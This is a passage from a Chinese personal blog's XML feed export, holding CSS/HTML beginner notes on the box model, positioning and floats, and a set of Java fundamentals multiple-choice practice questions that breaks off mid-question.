pointer;/*光标形态*/line-height: 200px;/*行高，文字在行高内居中*/overflow: hidden;/*处理溢出部分，多出的部分隐藏*/letter-spacint: 2em;/*字符间距，一个 em 等于一个 font-size*/}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>### 引入样式表的四种方式（就近原则）#### 行内式引入：在标签上添加 style 属性:<pre class="line-numbers language-CSS" data-language="CSS"><code class="language-CSS">style="样式 1:样式 1 的值; 样式 2:样式 2 的值"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>#### 嵌入式引入在 head 标签下添加一个 `<style></style>` 标签，在 `style` 标签下写样式。<h4 id="导入式引入"><a href="#导入式引入" class="headerlink" title="导入式引入"></a>导入式引入</h4><p>需要编写一个外部 CSS 文件(.css 文件)，在 <code>&lt;style&gt;&lt;/style&gt;</code> 标签下写一个导入指令:</p><pre class="line-numbers language-CSS" data-language="CSS"><code class="language-CSS">@import 文件位置<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="链接式引入"><a href="#链接式引入" class="headerlink" title="链接式引入"></a>链接式引入</h4><p>需要编写一个外部 CSS 文件(.css 文件)，在 <code>&lt;head&gt;</code> 标签中写入 <code>&lt;link&gt;</code> 标记引入外部文件:</p><pre class="line-numbers language-CSS" data-language="CSS"><code class="language-CSS">&lt;link rel="stylesheet" href="路径"/&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>导入式和链接式的区别：<br>导入式是同步加载的，需要等待 html 文档全部加载完毕才能加载该 CSS 样式文件；<br>链接式是异步加载的，和 html 文档同时加载。</p></blockquote><br>### 其他#### 超级链接的四种状态<pre class="line-numbers language-CSS" data-language="CSS"><code class="language-CSS">/*链接初始化状态*/a:link {color: green;text-decoration: none;}/*鼠标悬停状态*/a:hover {color: red;text-decoration: underline;}/*鼠标点击一瞬间的状态*/a:active {color: yellow;text-decoration: underline;}/*鼠标点击后的状态*/a:visited{color: grey;text-decoration: none;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>### 重置样式可以将块标签和行标签互换，也可以将加粗变为倾斜，倾斜变为加粗等等。<pre class="line-numbers language-CSS" data-language="CSS"><code class="language-CSS">b{/*加粗标签*/font-weight: normal;/*取消加粗*/font-style: italic;/*倾斜*/}i{/*倾斜标签*/font-style: normal;/*取消倾斜*/font-weight: bold;/*加粗*/}div{/*块级标签*/display:inline;/*改为行级标签*/}span{/*行级标签*/display:block;/*改为块标签*/}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>## div 布局在网页中确定每个模块的位置，也就是每个 div 盒子的位置。<h3 id="盒子模型"><a href="#盒子模型" class="headerlink" title="盒子模型"></a>盒子模型</h3><p>如图所示:<br><img src="http://wx4.sinaimg.cn/mw690/a6e9cb00ly1feiqdjhq12j205l05qwe9.jpg" alt="盒子模型"><br>一个盒子包含<strong>元素（图中蓝色部分）、内边距(padding)、边框(border)和外边距(margin)</strong> 四个元素。</p><ul><li>元素：可以设置元素的大小,width 和 height。</li><li>内边距：元素和边框的距离(padding)<pre class="line-numbers language-CSS" data-language="CSS"><code class="language-CSS">padding: 四周内边距;padding: 上下内边距 左右内边距;padding: 上内边距 左右内边距 下内边距;padding: 上内边距 右内边距 下内边距 左内边距;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li>边框：盒子的边框宽度(border)，可同时设置边框的类型和颜色。<pre class="line-numbers language-CSS" data-language="CSS"><code class="language-CSS">border: 四周边框的宽度 类型 颜色;border-top: 上边框的宽度 类型 颜色;border-bottom: 下边框的宽度 类型 颜色;border-left: 左边框的宽度 类型 颜色;border-right: 有边框的宽度 类型 颜色;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>外边距：盒子与盒子之间的距离(margin),<strong>上下相邻的两个盒子间距取两者中的最大外边距，而左右相邻的两个盒子间距为两者外边距的和</strong>。<pre class="line-numbers language-CSS" data-language="CSS"><code class="language-CSS">margin: 四周外边距;margin-top: 上外边距;margin-bottom: 下外边距;margin-left: 左外边距;margin-right: 右外边距;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><br>### 盒子定位通过 position 设置盒子的定位方式，通过 left、top 设置坐标1. 标准流定位：就是盒子的默认位置<pre class="line-numbers language-CSS" data-language="CSS"><code class="language-CSS">position: static;/*默认为 static*/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>2. 绝对定位：相对于整个网页的位置，left 为盒子距网页左侧的距离，top 为盒子距网页顶部的距离。绝对布局有 absolute 和 fixed 两种<pre class="line-numbers language-CSS" data-language="CSS"><code class="language-CSS">position: absolute;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-CSS" data-language="CSS"><code class="language-CSS">position: fixed;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>&gt;absolute 和 fixed 区别：&gt;absolute: 相对于页面，会随着滚动条移动。&gt;fixed：相对于浏览器窗口，不受滚动条影响，一直显示在浏览器窗口中的固定位置。3. 相对布局：相对于标准流定位的位置。<pre class="line-numbers language-CSS" data-language="CSS"><code class="language-CSS">position: relative;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>### 盒子浮动设置 float 属性，可以设置子元素在父容器中浮动(分层)。<pre class="line-numbers language-CSS" data-language="CSS"><code class="language-CSS">float: left;/*左浮动，靠左一字排开*/float: right;/*右浮动*/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>CSS:<pre class="line-numbers language-CSS" data-language="CSS"><code class="language-CSS">#father div{float: left;}#father p{clear: both;/*清楚浮动*/}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>HTML:<pre class="line-numbers language-HTML" data-language="HTML"><code class="language-HTML">&lt;div id="father"&gt;&lt;div id="son1&gt;son1&lt;/div&gt;&lt;div id="son2&gt;son2&lt;/div&gt;&lt;div id="son3&gt;son3&lt;/div&gt;&lt;p&gt;&lt;/p&gt;&lt;/div&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基础测试题</title>
      <link href="/2017/04/06/ji-chu-ce-shi-xuan-ze-ti/"/>
      <url>/2017/04/06/ji-chu-ce-shi-xuan-ze-ti/</url>
      
        <content type="html"><![CDATA[<p>做一些基础练习题检测一下自己的基础是否扎实吧！</p><span id="more"></span><h2 id="一-选择题（234）"><a href="#一-选择题（234）" class="headerlink" title="一. 选择题（234）"></a>一. 选择题（234）</h2><h3 id="1-下面中哪两个可以在-A-的子类中使用：（-）"><a href="#1-下面中哪两个可以在-A-的子类中使用：（-）" class="headerlink" title="1.下面中哪两个可以在 A 的子类中使用：（ ）"></a>1.下面中哪两个可以在 A 的子类中使用：（ ）</h3><pre><code>class A {    protected int method1 (int a, int b) {        return 0;    }}</code></pre><blockquote><p><strong>A public int method1 (int a, int b) { return 0; }</strong><br><strong>B private int method1 (int a, int b) { return 0; }</strong><br><strong>C private int method1 (int a, long b) { return 0; }</strong><br><strong>D public short method1 (int a, int b) { return 0; }</strong></p></blockquote><h3 id="2-Abstract-method-cannot-be-static-True-or-False"><a href="#2-Abstract-method-cannot-be-static-True-or-False" class="headerlink" title="2.Abstract method cannot be static True or False ?"></a>2.Abstract method cannot be static True or False ?</h3><blockquote><p><strong>A True</strong><br><strong>B False</strong></p></blockquote><h3 id="3-What-will-be-the-output-when-you-compile-and-execute-the-following-program"><a href="#3-What-will-be-the-output-when-you-compile-and-execute-the-following-program" class="headerlink" title="3.What will be the output when you compile and execute the following program."></a>3.What will be the output when you compile and execute the following program.</h3><pre><code>class Base{    void test() {         System.out.println("Base.test()");    }}public class Child extends Base {    void test() {        System.out.println("Child.test()");    }    static public void main(String[] a) {        Child anObj = new Child();        Base baseObj = (Base)anObj;        baseObj.test();    }}</code></pre><p>Select most appropriate answer.</p><blockquote><p><strong>A Child.test()<br>Base.test()</strong><br><strong>B Base.test()<br>Child.test()</strong><br><strong>C Base.test()</strong><br><strong>D Child.test()</strong></p></blockquote><h3 id="4-What-will-be-the-output-when-you-compile-and-execute-the-following-program"><a href="#4-What-will-be-the-output-when-you-compile-and-execute-the-following-program" class="headerlink" title="4.What will be the output when you compile and execute the following program."></a>4.What will be the output when you compile and execute the following program.</h3><pre><code>class Base {    static void test() {        System.out.println("Base.test()");    }}public class Child extends Base {    void test() {        System.out.println("Child.test()");        Base.test(); // Call the parent method    }    static public void main(String[] a) {        new Child().test();    }}</code></pre><p>Select most appropriate answer.</p><blockquote><p><strong>A Child.test()<br>Base.test()</strong><br><strong>B Child.test()<br>Child.test()</strong><br><strong>C Compilation error. Cannot override a static method by an instance method</strong><br><strong>D Runtime error. Cannot override a static method by an instance method</strong></p></blockquote><h3 id="5-What-will-be-the-output-when-you-compile-and-execute-the-following-program"><a href="#5-What-will-be-the-output-when-you-compile-and-execute-the-following-program" class="headerlink" title="5.What will be the output when you compile and execute the following program."></a>5.What will be the output when you compile and execute the following program.</h3><pre><code>public class Base {    private void test() {        System.out.println(6 + 6 + "(Result)");    }    static public void main(String[] a) {        new Base().test();    }}</code></pre><p>Select most appropriate answer.</p><blockquote><p><strong>A 66(Result)</strong><br><strong>B 12(Result)</strong><br><strong>C Runtime Error.Incompatible type for +. Can’t convert an int to a string.</strong><br><strong>D Compilation Error.Incompatible type for +. Can’t add a string to an int.</strong></p></blockquote><h3 id="6-What-will-be-the-output-when-you-compile-and-execute-the-following-program-The-symbol-‘-‘-means-space"><a href="#6-What-will-be-the-output-when-you-compile-and-execute-the-following-program-The-symbol-‘-‘-means-space" class="headerlink" title="6.What will be the output when you compile and execute the following program. The symbol ‘ ‘ means space."></a>6.What will be the output when you compile and execute the following program. The symbol ‘ ‘ means space.</h3><pre><code>public class Base {    private void test() {        String aStr = " One ";        String bStr = aStr;        aStr.toUpperCase();        aStr.trim();        System.out.println("[" + aStr + "," + bStr + "]");    }    static public void main(String[] a) {        new Base().test();    }}</code></pre><p>Select most appropriate answer.</p><blockquote><p><strong>A [ONE One ]</strong><br><strong>B [ One ,One]</strong><br><strong>C [ONE,One]</strong><br><strong>D [ONE,ONE]<br>E [ One , One ]</strong></p></blockquote><h3 id="7-下面关于变量及其范围的陈述哪些是不正确的（-）："><a href="#7-下面关于变量及其范围的陈述哪些是不正确的（-）：" class="headerlink" title="7.下面关于变量及其范围的陈述哪些是不正确的（ ）："></a>7.下面关于变量及其范围的陈述哪些是不正确的（ ）：</h3><blockquote><p><strong>A 实例变量是类的成员变量</strong><br><strong>B 实例变量用关键字 static 声明</strong><br><strong>C 在方法中定义的局部变量在该方法被执行时创建</strong><br><strong>D 局部变量在使用前必须被初始化</strong></p></blockquote><h3 id="8-下列关于修饰符混用的说法，错误的是（-）："><a href="#8-下列关于修饰符混用的说法，错误的是（-）：" class="headerlink" title="8.下列关于修饰符混用的说法，错误的是（ ）："></a>8.下列关于修饰符混用的说法，错误的是（ ）：</h3><blockquote><p><strong>A abstract 不能与 final 并列修饰同一个类</strong><br><strong>B abstract 类中可以有 private 的成员</strong><br><strong>C abstract 方法必须在 abstract 类中</strong><br><strong>D static 方法中能处理非 static 的属性</strong></p></blockquote><h3 id="9-执行完以下代码"><a href="#9-执行完以下代码" class="headerlink" title="9.执行完以下代码"></a>9.执行完以下代码</h3><pre><code>int [ ] x = new int[25];</code></pre><p>后，以下哪项说明是正确的（ ）：</p><blockquote><p><strong>A x[24]为 0</strong><br><strong>B x[24]未定义</strong><br><strong>C x[25]为 0</strong><br><strong>D x[0]为空</strong></p></blockquote><h3 id="10-编译运行以下程序后，关于输出结果的说明正确的是-（-）："><a href="#10-编译运行以下程序后，关于输出结果的说明正确的是-（-）：" class="headerlink" title="10.编译运行以下程序后，关于输出结果的说明正确的是 （ ）："></a>10.编译运行以下程序后，关于输出结果的说明正确的是 （ ）：</h3><pre><code>public class Conditional {    public static void main(String args[ ]){     int x=4;     System.out.println("value is "+ ((x&gt;4) ? 99.9 :9));     }}</code></pre><blockquote><p><strong>A 输出结果为：value is 99.99</strong><br><strong>B 输出结果为：value is 9</strong><br><strong>C 输出结果为：value is 9.0</strong><br><strong>D 编译错误</strong></p></blockquote><h3 id="11-关于以下-application-的说明，正确的是（-）："><a href="#11-关于以下-application-的说明，正确的是（-）：" class="headerlink" title="11.关于以下 application 的说明，正确的是（ ）："></a>11.关于以下 application 的说明，正确的是（ ）：</h3><pre><code>class StaticStuff {    static int x = 10;    static {        x += 5;    }    public static void main(String args[]) {        System.out.println("x=" + x);    }    static {        x /= 3;    }}</code></pre><blockquote><p><strong>A 4 行与 9 行不能通过编译，因为缺少方法名和返回类型</strong><br><strong>B 9 行不能通过编译，因为只能有一个静态初始化器</strong><br><strong>C 编译通过，执行结果为：x=5</strong><br><strong>D 编译通过，执行结果为：x=3</strong></p></blockquote><h3 id="12-关于以下程序代码的说明正确的是（-）："><a href="#12-关于以下程序代码的说明正确的是（-）：" class="headerlink" title="12.关于以下程序代码的说明正确的是（ ）："></a>12.关于以下程序代码的说明正确的是（ ）：</h3><pre><code>class HasStatic {    private static int x = 100;    public static void main(String args[]) {        HasStatic hs1 = new HasStatic();        hs1.x++;        HasStatic hs2 = new HasStatic();        hs2.x++;        hs1 = new HasStatic();        hs1.x++;        HasStatic.x--;        System.out.println("x=" + x);    }}</code></pre><blockquote><p><strong>A 5 行不能通过编译，因为引用了私有静态变量</strong><br><strong>B 10 行不能通过编译，因为 x 是私有静态变量</strong><br><strong>C 程序通过编译，输出结果为：x=103</strong><br><strong>D 程序通过编译，输出结果为：x=102</strong></p></blockquote><h3 id="13-下列说法正确的有（）"><a href="#13-下列说法正确的有（）" class="headerlink" title="13.下列说法正确的有（）"></a>13.下列说法正确的有（）</h3><blockquote><p><strong>A  class 中的 constructor 不可省略</strong><br><strong>B  constructor 必须与 class 同名，但方法不能与 class 同名</strong><br><strong>C  constructor 在一个对象被 new 时执行</strong><br><strong>D 一个 class 只能定义一个 constructor</strong></p></blockquote><h3 id="14-下列哪种说法是正确的（）"><a href="#14-下列哪种说法是正确的（）" class="headerlink" title="14.下列哪种说法是正确的（）"></a>14.下列哪种说法是正确的（）</h3><blockquote><p><strong>A 实例方法可直接调用超类的实例方法</strong><br><strong>B 实例方法可直接调用超类的类方法</strong><br><strong>C 实例方法可直接调用其他类的实例方法</strong><br><strong>D 实例方法可直接调用本类的类方法</strong></p></blockquote><h3 id="15-下列哪一种叙述是正确的（-）"><a href="#15-下列哪一种叙述是正确的（-）" class="headerlink" title="15.下列哪一种叙述是正确的（ ）"></a>15.下列哪一种叙述是正确的（ ）</h3><blockquote><p><strong>A  abstract 修饰符可修饰字段、方法和类</strong><br><strong>B  抽象方法的 body 部分必须用一对大括号{ }包住</strong><br><strong>C  声明抽象方法，大括号可有可无</strong><br><strong>D  声明抽象方法不可写出大括号</strong></p></blockquote><h3 id="16-下面代码的执行结果是？"><a href="#16-下面代码的执行结果是？" class="headerlink" title="16.下面代码的执行结果是？"></a>16.下面代码的执行结果是？</h3><pre><code>import java.util.*;public class ShortSet {    public static void main(String args[]) {        Set&lt;Short&gt; s = new HashSet&lt;Short&gt;();        for (Short i = 0; i &lt; 100; i++) {            s.add(i);            s.remove(i - 1);        }        System.out.println(s.size());    }}</code></pre><blockquote><p><strong>A 1</strong><br><strong>B 100</strong><br><strong>C Throws Exception</strong><br><strong>D None of the Above</strong></p></blockquote><h3 id="17-链表具有的特点是："><a href="#17-链表具有的特点是：" class="headerlink" title="17.链表具有的特点是："></a>17.链表具有的特点是：</h3><blockquote><p><strong>A 不必事先估计存储空间</strong><br><strong>B 可随机访问任一元素</strong><br><strong>C 插入删除不需要移动元素</strong><br><strong>D 所需空间与线性表长度成正比</strong></p></blockquote><h3 id="18-Java-语言中，String-类的-IndexOf-方法返回的类型是？"><a href="#18-Java-语言中，String-类的-IndexOf-方法返回的类型是？" class="headerlink" title="18.Java 语言中，String 类的 IndexOf()方法返回的类型是？"></a>18.Java 语言中，String 类的 IndexOf()方法返回的类型是？</h3><blockquote><p><strong>A Int16 B Int32 C int D long</strong></p></blockquote><h3 id="19-以下关于面向对象概念的描述中，不正确的一项是（）。"><a href="#19-以下关于面向对象概念的描述中，不正确的一项是（）。" class="headerlink" title="19.以下关于面向对象概念的描述中，不正确的一项是（）。"></a>19.以下关于面向对象概念的描述中，不正确的一项是（）。</h3><blockquote><p><strong>A 在现实生活中，对象是指客观世界的实体</strong><br><strong>B 程序中的对象就是现实生活中的对象</strong><br><strong>C 在程序中，对象是通过一种抽象数据类型来描述的，这种抽象数据类型称为类（class）</strong><br><strong>D 在程序中，对象是一组变量和相关方法的集合</strong></p></blockquote><h3 id="20-执行下列代码后-哪个结论是正确的"><a href="#20-执行下列代码后-哪个结论是正确的" class="headerlink" title="20.执行下列代码后,哪个结论是正确的"></a>20.执行下列代码后,哪个结论是正确的</h3><pre><code>String[] s=new String[10];</code></pre><blockquote><p><strong>A  s[9] 为 null;</strong><br><strong>B  s[10] 为 “”;</strong><br><strong>C  s[0] 为 未定义</strong><br><strong>D  s.length 为 10</strong></p></blockquote><h3 id="21-属性的可见性有。-选择-3-项"><a href="#21-属性的可见性有。-选择-3-项" class="headerlink" title="21.属性的可见性有。(选择 3 项)"></a>21.属性的可见性有。(选择 3 项)</h3><blockquote><p><strong>A 公有的</strong><br><strong>B 私有的</strong><br><strong>C 私有保护的</strong><br><strong>D 保护的</strong></p></blockquote><h3 id="22-在字符串前面加上-符号，则字符串中的转义字符将不被处理。"><a href="#22-在字符串前面加上-符号，则字符串中的转义字符将不被处理。" class="headerlink" title="22.在字符串前面加上 _____ 符号，则字符串中的转义字符将不被处理。"></a>22.在字符串前面加上 _____ 符号，则字符串中的转义字符将不被处理。</h3><blockquote><p><strong>A @</strong><br>*<em>B *</em><br><strong>C #</strong><br><strong>D %</strong></p></blockquote><h3 id="23-下列代码哪行会出错"><a href="#23-下列代码哪行会出错" class="headerlink" title="23.下列代码哪行会出错:"></a>23.下列代码哪行会出错:</h3><pre><code>1) public void modify() {2)     int I, j, k;3)     I = 100;4)     while ( I &gt; 0 ) {5)         j = I * 2;6)         System.out.println (" The value of j is " + j );7)         k = k + 1;8)         I--;9)     }10)}</code></pre><blockquote><p><strong>A 4</strong><br><strong>B 6</strong><br><strong>C 7</strong><br><strong>D 8</strong></p></blockquote><h3 id="24-对记录序列-314，298，508，123，486，145-按从小到大的顺序进行插入排序，经过两趟排序后的结果为："><a href="#24-对记录序列-314，298，508，123，486，145-按从小到大的顺序进行插入排序，经过两趟排序后的结果为：" class="headerlink" title="24.对记录序列{314，298，508，123，486，145}按从小到大的顺序进行插入排序，经过两趟排序后的结果为："></a>24.对记录序列{314，298，508，123，486，145}按从小到大的顺序进行插入排序，经过两趟排序后的结果为：</h3><blockquote><p><strong>A {314，298，508，123，145，486}</strong><br><strong>B {298，314，508，123，486，145}</strong><br><strong>C {298，123，314，508，486，145}</strong><br><strong>D {123、298，314，508，486，145}</strong></p></blockquote><h3 id="25-栈是一种。"><a href="#25-栈是一种。" class="headerlink" title="25.栈是一种。"></a>25.栈是一种。</h3><blockquote><p><strong>A 存取受限的线性结构</strong><br><strong>B 存取不受限的线性结构</strong><br><strong>C 存取受限的非线性结构</strong><br><strong>D 存取不受限的非线性结构</strong></p></blockquote><h3 id="26-下列哪些语句关于内存回收的说明是正确的。"><a href="#26-下列哪些语句关于内存回收的说明是正确的。" class="headerlink" title="26.下列哪些语句关于内存回收的说明是正确的。"></a>26.下列哪些语句关于内存回收的说明是正确的。</h3><blockquote><p><strong>A 程序员必须创建一个线程来释放内存</strong><br><strong>B 内存回收程序负责释放无用内存</strong><br><strong>C 内存回收程序允许程序员直接释放内存</strong><br><strong>D 内存回收程序可以在指定的时间释放内存对象</strong></p></blockquote><h3 id="27-Which-method-must-be-defined-by-a-class-implementing-the-java-lang-Runnable-interface"><a href="#27-Which-method-must-be-defined-by-a-class-implementing-the-java-lang-Runnable-interface" class="headerlink" title="27.Which method must be defined by a class implementing the java.lang.Runnable interface?"></a>27.Which method must be defined by a class implementing the java.lang.Runnable interface?</h3><blockquote><p><strong>A void run()</strong><br><strong>B public void run()</strong><br><strong>C public void start()</strong><br><strong>D void run(int priority)<br>E public void run(int priority)<br>F public void start(int priority)</strong></p></blockquote><h3 id="28-Given"><a href="#28-Given" class="headerlink" title="28 Given:"></a>28 Given:</h3><pre><code>public static void main(String[] args) {    Object obj = new Object() {        public int hashCode() {            return 42;        }    };    System.out.println(obj.hashCode());}</code></pre><p>What is the result?</p><blockquote><p><strong>A 42</strong><br><strong>B An exception is thrown at runtime.</strong><br><strong>C Compilation fails because of an error on line 12.</strong><br><strong>D Compilation fails because of an error on line 16.<br>E Compilation fails because of an error on line 17.</strong></p></blockquote><h3 id="29-Which-two-are-reserved-words-in-the-Java-programming-language"><a href="#29-Which-two-are-reserved-words-in-the-Java-programming-language" class="headerlink" title="29 Which two are reserved words in the Java programming language?"></a>29 Which two are reserved words in the Java programming language?</h3><blockquote><p><strong>A run</strong><br><strong>B import</strong><br><strong>C default</strong><br><strong>D implements</strong></p></blockquote><h3 id="30-Which-two-statements-are-true-regarding-the-return-values-of-property-written-hashCodeand-equals-methods-from-two-instances-of-the-same-class"><a href="#30-Which-two-statements-are-true-regarding-the-return-values-of-property-written-hashCodeand-equals-methods-from-two-instances-of-the-same-class" class="headerlink" title="30. Which two statements are true regarding the return values of property written hashCodeand equals methods from two instances of the same class?"></a>30. Which two statements are true regarding the return values of property written hashCodeand equals methods from two instances of the same class?</h3><blockquote><p><strong>A If the hashCode values are different, the objects might be equal.</strong><br><strong>B If the hashCode values are the same, the object must be equal.</strong><br><strong>C If the hashCode values are the same, the objects might be equal.</strong><br><strong>D If the hashCode values are different, the objects must be unequal.</strong></p></blockquote><h3 id="31-What-is-the-numerical-range-of-a-char"><a href="#31-What-is-the-numerical-range-of-a-char" class="headerlink" title="31. What is the numerical range of a char?"></a>31. What is the numerical range of a char?</h3><blockquote><p><strong>A 0 … 32767</strong><br><strong>B 0 … 65535</strong><br><strong>C –256 … 255</strong><br>**D –32768 … 32767<br>E Range is platform dependent. **</p></blockquote><h3 id="32-Given"><a href="#32-Given" class="headerlink" title="32. Given:"></a>32. Given:</h3><pre><code>public class Test {    private static float[] f = new float[2];    public static void main(String args[]) {        System.out.println("f[0] = " + f[0]);    }}</code></pre><p>What is the result?</p><blockquote><p><strong>A f[0] = 0</strong><br><strong>B f[0] = 0.0</strong><br><strong>C Compilation fails.</strong><br><strong>D An exception is thrown at runtime.</strong></p></blockquote><h3 id="33-Given"><a href="#33-Given" class="headerlink" title="33. Given:"></a>33. Given:</h3><pre><code>public class Test {    public static void main(String[] args) {        String str = NULL;        System.out.println(str);    }}</code></pre><p>What is the result?</p><blockquote><p><strong>A NULL</strong><br><strong>B Compilation fails.</strong><br><strong>C The code runs with no output.</strong><br><strong>D An exception is thrown at runtime.</strong></p></blockquote><h3 id="34、Exhibit"><a href="#34、Exhibit" class="headerlink" title="34、Exhibit:"></a>34、Exhibit:</h3><pre><code>public class X implements Runnable {    private int x;    private int y;    public static void main(String[] args) {        X that = new X();        (new Thread(that)).start();        (new Thread(that)).start();    }    public synchronized void run() {        for (;;) {            x++;            y++;            System.out.println("x = " + x + ", y = " + y);        }    }}</code></pre><p>What is the result?</p><blockquote><p><strong>A An error at line 11 causes compilation to fail.</strong><br><strong>B Errors at lines 7 and 8 cause compilation to fail.</strong><br><strong>C The program prints pairs of values for x and y that might not always be the same on the same line (for example, “x=2, y=1”)</strong><br><strong>D The program prints pairs of values for x and y that are always the same on the same line (for example, “x=1, y=1”. In addition, each value appears twice (for example, “x=1, y=1” followed by “x=1, y=1”)<br>E The program prints pairs of values for x and y that are always the same on the same line (for example, “x=1, y=1”. In addition, each value appears twice (for example, “x=1, y=1” followed by “x=2, y=2”)</strong></p></blockquote><h3 id="35、Which-two-CANNOT-directly-cause-a-thread-to-stop-executing"><a href="#35、Which-two-CANNOT-directly-cause-a-thread-to-stop-executing" class="headerlink" title="35、Which two CANNOT directly cause a thread to stop executing?"></a>35、Which two CANNOT directly cause a thread to stop executing?</h3><blockquote><p><strong>A Existing from a synchronized block.</strong><br><strong>B Calling the wait method on an object.</strong><br><strong>C Calling notify method on an object.</strong><br><strong>D Calling read method on an InputStream object.<br>E Calling the SetPriority method on a Thread object.</strong></p></blockquote><h3 id="36、-Which-two-statements-are-true-regarding-the-creation-of-a-default-constructor"><a href="#36、-Which-two-statements-are-true-regarding-the-creation-of-a-default-constructor" class="headerlink" title="36、 Which two statements are true regarding the creation of a default constructor?"></a>36、 Which two statements are true regarding the creation of a default constructor?</h3><blockquote><p><strong>A The default constructor initializes method variables.</strong><br><strong>B The default constructor invokes the no-parameter constructor of the superclass.</strong><br><strong>C The default constructor initializes the instance variables declared in the class.</strong><br><strong>D If a class lacks a no-parameter constructor,, but has other constructors, the compiler creates a default constructor.<br>E The compiler creates a default constructor only when there are no other constructors for the class.</strong></p></blockquote><h3 id="37、-Given"><a href="#37、-Given" class="headerlink" title="37、 Given:"></a>37、 Given:</h3><pre><code>public class OuterClass {    private double d1 = 1.0;    // insert code here}</code></pre><p>You need to insert an inner class declaration at line2. Which two inner class declarations are valid? </p><blockquote><p><strong>A static class InnerOne { public double methoda() {return d1;} }</strong><br><strong>B static class InnerOne { static double methoda() {return d1;} }</strong><br><strong>C private class InnerOne { public double methoda() {return d1;} }</strong><br><strong>D protected class InnerOne { static double methoda() {return d1;} }<br>E public abstract class InnerOne { public abstract double methoda(); }</strong></p></blockquote><h3 id="38、-Which-two-declarations-prevent-the-overriding-of-a-method"><a href="#38、-Which-two-declarations-prevent-the-overriding-of-a-method" class="headerlink" title="38、 Which two declarations prevent the overriding of a method?"></a>38、 Which two declarations prevent the overriding of a method?</h3><blockquote><p><strong>A final void methoda() {}</strong><br><strong>B void final methoda() {}</strong><br><strong>C static void methoda() {}</strong><br><strong>D static final void methoda() {}<br>E final abstract void methoda() {}</strong></p></blockquote><h3 id="39、Given"><a href="#39、Given" class="headerlink" title="39、Given:"></a>39、Given:</h3><pre><code>public class Test {    public static void main(String args[]) {        class Foo {            public int i = 3;        }        Object o = (Object) new Foo();        Foo foo = (Foo) o;        System.out.println(foo.i);    }}</code></pre><p>What is the result?</p><blockquote><p>**A Compilation will fail. **<br><strong>B Compilation will succeed and the program will print “3”</strong><br><strong>C Compilation will succeed but the program will throw a ClassCastException at line 6.</strong><br><strong>D Compilation will succeed but the program will throw a ClassCastException at line 7.</strong></p></blockquote><h3 id="40、-Given"><a href="#40、-Given" class="headerlink" title="40、 Given:"></a>40、 Given:</h3><pre><code>public class Test {    public static void main(String[] args) {        String foo = "blue";        String bar = foo;        foo = "green";        System.out.println(bar);    }}</code></pre><p>What is the result?</p><blockquote><p><strong>A An exception is thrown.</strong><br><strong>B The code will not compile.</strong><br><strong>C The program prints “null”</strong><br><strong>D The program prints “blue”<br>E The program prints “green”</strong></p></blockquote><h3 id="41、Which-code-determines-the-int-value-foo-closest-to-a-double-value-bar"><a href="#41、Which-code-determines-the-int-value-foo-closest-to-a-double-value-bar" class="headerlink" title="41、Which code determines the int value foo closest to a double value bar?"></a>41、Which code determines the int value foo closest to a double value bar?</h3><blockquote><p><strong>A int foo = (int) Math.max(bar);</strong><br><strong>B int foo = (int) Math.min(bar);</strong><br><strong>C int foo = (int) Math.abs(bar);</strong><br>**D int foo = (int) Math.ceil(bar);<br>E int foo = (int) Math.floor(bar);<br>F int foo = (int) Math.round(bar); **</p></blockquote><h3 id="42、-Exhibit"><a href="#42、-Exhibit" class="headerlink" title="42、 Exhibit:"></a>42、 Exhibit:</h3><pre><code>package foo;import java.util.Vector;public class MyNewVector extends MyVector {    public MyNewVector() {        i = 4;    }    public static void main(String args[]) {        MyVector v = new MyNewVector();    }}</code></pre><p>The file MyNewVector.java is shown in the exhibit. What is the result?</p><blockquote><p><strong>A Compilation will succeed.</strong><br><strong>B Compilation will fail at line 3.</strong><br><strong>C Compilation will fail at line 6.</strong><br><strong>D Compilation will fail at line 9.<br>E Compilation will fail at line 14.</strong></p></blockquote><h3 id="43、Given"><a href="#43、Given" class="headerlink" title="43、Given:"></a>43、Given:</h3><pre><code>public class Test {    public static void main(String[] args) {        String foo = args[1];        String bar = args[2];        String baz = args[3];        System.out.println("baz = " + baz);    }}</code></pre><p>And the output:</p><pre><code>Baz = 2</code></pre><p>Which command line invocation will produce the output?</p><blockquote><p><strong>A java Test 2222</strong><br><strong>B java Test 1 2 3 4</strong><br><strong>C java Test 4 2 4 2</strong><br><strong>D java Test 4 3 2 1</strong></p></blockquote><h3 id="44、-Given"><a href="#44、-Given" class="headerlink" title="44、 Given:"></a>44、 Given:</h3><pre><code>public interface Foo {    int k = 4;}</code></pre><p>Which three are equivalent to line 2? </p><blockquote><p><strong>A final int k = 4;</strong><br><strong>B Public int k = 4;</strong><br><strong>C static int k = 4;</strong><br><strong>D Private int k = 4;<br>E Abstract int k = 4;<br>F Volatile int k = 